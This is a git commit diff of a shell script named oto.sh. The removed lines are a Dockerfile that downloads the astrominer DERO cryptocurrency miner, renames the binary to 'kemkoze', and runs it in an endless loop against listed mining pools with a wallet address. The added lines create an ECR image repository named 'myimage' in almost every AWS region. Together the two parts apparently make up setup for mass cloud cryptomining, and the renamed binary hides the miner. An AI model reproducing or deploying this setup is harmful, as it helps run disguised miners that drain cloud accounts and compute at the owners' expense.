2cba116bdd4da285211299ea534a0988903554ba
levent1913 <46969193+levent1913@users.noreply.github.com>
2023-05-21 17:49:04 +0300

    Update oto.sh

--- oto.sh
+++ oto.sh
@@ -1,23 +1,28 @@
-FROM ubuntu:latest
+aws ecr --region us-east-1 create-repository --repository-name myimage
+aws ecr --region us-east-2 create-repository --repository-name myimage
+aws ecr --region us-west-1 create-repository --repository-name myimage
+aws ecr --region us-west-2 create-repository --repository-name myimage
+aws ecr --region ap-southeast-1 create-repository --repository-name myimage
+aws ecr --region ap-northeast-1 create-repository --repository-name myimage
+aws ecr --region ap-northeast-2 create-repository --repository-name myimage
+aws ecr --region eu-central-1 create-repository --repository-name myimage
+aws ecr --region eu-west-1 create-repository --repository-name myimage
+aws ecr --region eu-west-3 create-repository --repository-name myimage
+aws ecr --region eu-north-1 create-repository --repository-name myimage
+aws ecr --region sa-east-1 create-repository --repository-name myimage
+aws ecr --region ap-south-1 create-repository --repository-name myimage
+aws ecr --region eu-west-2 create-repository --repository-name myimage
+aws ecr --region ca-central-1 create-repository --repository-name myimage
+aws ecr --region ap-northeast-3 create-repository --repository-name myimage
+aws ecr --region ap-southeast-2 create-repository --repository-name myimage
 
-# Update packages and install necessary dependencies
-RUN apt-get update && apt-get install -y wget tar
-
-# Download and extract the astrominer binary
-RUN wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.1/astrominer-V1.9.1.R2_generic_amd64_linux.tar.gz -O kozel.tar.gz \
-    && tar xzvf kozel.tar.gz \
-    && rm kozel.tar.gz
-
-# Change directory to the astrominer folder
-WORKDIR astrominer
-
-# Rename astrominer binary to kemkoze
-RUN mv astrominer kemkoze
-
-# Set execute permission for kemkoze binary
-RUN chmod +x kemkoze
-
-# Run the astrominer command in an infinite loop
-CMD while true; do ./kemkoze -w dero1qyjrpntvr5g7njsg5wh652m42qrzljlnrqljc4xlgdz9d4kj7g9dvqqtcr6xr -r dero-node-yashnik-eu.mysrv.cloud:10300 -r1 dero-node.mysrv.cloud:10300 -r2 dero-node-ch4k1pu.mysrv.cloud:10300 -report-realtime-hashrate; done
-
-
+aws ecr --region af-south-1 create-repository --repository-name myimage
+aws ecr --region ap-east-1 create-repository --repository-name myimage
+aws ecr --region ap-south-2 create-repository --repository-name myimage
+aws ecr --region ap-southeast-3 create-repository --repository-name myimage
+aws ecr --region ap-southeast-4 create-repository --repository-name myimage
+aws ecr --region eu-south-1 create-repository --repository-name myimage
+aws ecr --region eu-south-2 create-repository --repository-name myimage
+aws ecr --region eu-central-2 create-repository --repository-name myimage
+aws ecr --region me-south-1 create-repository --repository-name myimage
+aws ecr --region me-central-1 create-repository --repository-name myimage
